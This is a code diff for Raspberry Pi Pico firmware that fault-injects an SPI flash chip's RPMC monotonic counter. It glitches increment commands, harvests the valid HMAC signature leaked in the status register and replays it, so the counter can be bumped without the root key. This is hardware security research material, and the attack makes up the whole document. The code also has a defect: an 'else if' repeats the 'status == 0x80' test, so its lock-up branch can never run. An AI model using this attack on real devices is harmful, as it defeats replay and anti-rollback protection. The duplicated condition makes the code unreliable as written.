@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
+#include <inttypes.h>
 #include "pico/stdlib.h"
 #include "pico/binary_info.h"
 #include "mbedtls/md.h"
@@ -29,14 +30,15 @@ static int glitch_increment(void * const spi_connection,
                             const uint32_t old_counter_value)
 {
     const size_t signature_offset = RPMC_OP1_MSG_HEADER_LENGTH + RPMC_COUNTER_LENGTH;
-    const uint8_t get_counter_msg[RPMC_GET_MONOTONIC_COUNTER_MSG_LENGTH] = {
+    // Any size payload between 5 and RPMC_GET_MONOTONIC_COUNTER_MSG_LENGTH works
+    const uint8_t get_counter_msg[5] = {
         OP1_OPCODE, // Opcode
 		0x03, // CmdType
 		target_counter, // CounterAddr
 		0 // Reserved
     };
-    printf("Trying to glitch increment:\n");
-    for (size_t glitch_cycles = 9600; glitch_cycles <= 9700; glitch_cycles++) {
+
+    for (size_t glitch_cycles = 9500; glitch_cycles <= 9700; glitch_cycles += 20) {
         uint8_t increment_msg[RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH] = {
             OP1_OPCODE, // Opcode
             0x02, // CmdType
@@ -47,64 +49,54 @@ static int glitch_increment(void * const spi_connection,
             (old_counter_value >> 8) & 0xff,
             old_counter_value & 0xff
         };
-        // Just to the message easier
-        memset(increment_msg + signature_offset, 0xff, RPMC_SIGNATURE_LENGTH);
+        // Just to find the signature easier
+        memset(increment_msg + signature_offset, 0x42, RPMC_SIGNATURE_LENGTH);
 
         multicore_fifo_push_blocking(glitch_cycles);
         // Synchronize with core1
         multicore_fifo_pop_blocking();
-
+        
         spi_transaction(spi_connection, cs_pin, increment_msg, RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH, NULL, 0);
 
         // Synchronize with core1 to ensure the glitch doesn't happen at a later point
         multicore_fifo_pop_blocking();
         
-        // Wait for the core to stabilize again
-        sleep_ms(10);
-        poll_until_finished(spi_connection, cs_pin);
-        
-        spi_transaction(spi_connection, cs_pin, get_counter_msg, RPMC_GET_MONOTONIC_COUNTER_MSG_LENGTH, NULL, 0);
-        poll_until_finished(spi_connection, cs_pin);
+        sleep_us(200);
+        spi_transaction(spi_connection, cs_pin, get_counter_msg, sizeof(get_counter_msg), NULL, 0);
+        sleep_us(200);
 
         struct rpmc_status_register full_status;
         get_full_rpmc_status(spi_connection, cs_pin, &full_status);
-        if (full_status.return_code != 0x80) {
-            printf("Get failed after delay of %u\n", glitch_cycles);
-            printf("Full rpmc status register: ");
-            for (size_t i = 0; i < sizeof(struct rpmc_status_register); i++)
-                printf("%02x", ((uint8_t *)&full_status)[i]);
-            printf("\n");
-
-            printf("Trying increment with found signature\n");
+        if (full_status.return_code == 0x04) {
             memcpy(increment_msg + signature_offset, full_status.signature, RPMC_SIGNATURE_LENGTH);
             spi_transaction(spi_connection, cs_pin, increment_msg, RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH, NULL, 0);
             poll_until_finished(spi_connection, cs_pin);
-            if (get_rpmc_status(spi_connection, cs_pin) == 0x80) {
-                printf("The signature worked, took %u tries\n", glitch_cycles - 9600);
+            const uint8_t status = get_rpmc_status(spi_connection, cs_pin);
+
+            if (status == 0x80) {
+                printf("Glitch with delay %u\nFull rpmc status register: ", glitch_cycles);
+                for (size_t i = 0; i < sizeof(struct rpmc_status_register); i++)
+                    printf("%02x", ((uint8_t *)&full_status)[i]);
+                printf("\n");
                 return 0;
+            } else if (status == 0x80) {
+                // In this case the chip has locked up
+                // Updating the hmac key register usually works
+                return 2;
             }
         }
-    }    
-    printf("Done glitching\n");
-
-    return 0;
+    }
+    return 1;
 }
 
-static int setup(void * const spi_connection, const unsigned int cs_pin)
+static int setup_increment_glitch(void * const spi_connection, const unsigned int cs_pin)
 {
-    /*
-    const uint8_t root_key[RPMC_HMAC_KEY_LENGTH] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-    */
     const uint8_t root_key[RPMC_HMAC_KEY_LENGTH] = {0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
                                                     0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
                                                     0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
                                                     0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa};
     const uint8_t key_data[RPMC_KEY_DATA_LENGTH] = {0x00, 0x00, 0x00, 0x00};
     const uint8_t target_counter = 0;
-    uint32_t old_counter_value;
 
     uint8_t hmac_key_register[RPMC_HMAC_KEY_LENGTH];
     if (mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256), root_key, RPMC_HMAC_KEY_LENGTH, key_data, RPMC_KEY_DATA_LENGTH, hmac_key_register)) {
@@ -112,32 +104,45 @@ static int setup(void * const spi_connection, const unsigned int cs_pin)
         return 1;
     }
 
-    if (update_hmac_key_register(spi_connection, cs_pin, target_counter, hmac_key_register, key_data)) {
-        printf("Error: could not update hmac key register\n");
-        return 1;
+    size_t increments = 0;
+    bool failed_once = false;
+    const uint64_t start = time_us_64();
+    while (increments < 10) {
+        // This message is always the same for the same key data
+        if (update_hmac_key_register(spi_connection, cs_pin, target_counter, hmac_key_register, key_data)) {
+            printf("Error: could not update hmac key register\n");
+            return 1;
+        }
+
+        uint32_t curr_counter_value;
+        // This message changes depending on the key data value used in the previous update hmac key command
+        // But if we catch the previous update hmac key command, we also know the get counter message
+        // We just can't validate the signature without the root key. But that doesn't matter, since we can still read the counter value
+        if (get_counter_value(spi_connection, cs_pin, target_counter, hmac_key_register, &curr_counter_value)) {
+            printf("Error: could not get old counter values\n");
+            return 1;
+        }
+
+        printf("Trying to glitch %u\n", curr_counter_value);
+        if (glitch_increment(spi_connection, cs_pin, target_counter, curr_counter_value)) {
+            if (failed_once) {
+                printf("Failed\n");
+                break;
+            }
+            failed_once = true;
+        } else {
+            failed_once = false;
+            increments++;
+        }
     }
+    const uint64_t time_taken = time_us_64() - start;
 
-    if (get_counter_value(spi_connection, cs_pin, target_counter, hmac_key_register, &old_counter_value)) {
-        printf("Error: could not get old counter values\n");
-        return 1;
-    }
 
-    printf("Starting with old value: %u\n", old_counter_value);
-
-    int ret = glitch_increment(spi_connection, cs_pin, target_counter, old_counter_value);
-    if (ret)
-        return ret;
-    
-    uint32_t new_counter_value;
-    if (get_counter_value(spi_connection, cs_pin, target_counter, hmac_key_register, &new_counter_value)) {
-        printf("Error: could not get new counter values\n");
-        return 1;
-    }
-
-    printf("Glitching changed counter from %u -> %u\n", old_counter_value, new_counter_value);
+    printf("Incrementing the counter by %u took %" PRIu64 " us (%" PRIu64 " us per increment)\n", increments, time_taken, time_taken / increments);
     
     return 0;
 }
+
 
 void __time_critical_func(core1_glitch_pulldown_loop)(void)
 {
@@ -194,12 +199,11 @@ int main()
     multicore_reset_core1();
     multicore_launch_core1(core1_glitch_pulldown_loop);
 
-    int ret = setup(spi0, PICO_DEFAULT_SPI_CSN_PIN);
+    int ret = setup_increment_glitch(spi0, PICO_DEFAULT_SPI_CSN_PIN);
 
     // Don't leave the pin shorted if something goes wrong    
     gpio_put(TRANSMIT_GLITCH_PIN, 0);
     spi_deinit(spi0);
-
 
     while (true) {
         cyw43_arch_gpio_put(CYW43_WL_GPIO_LED_PIN, true);
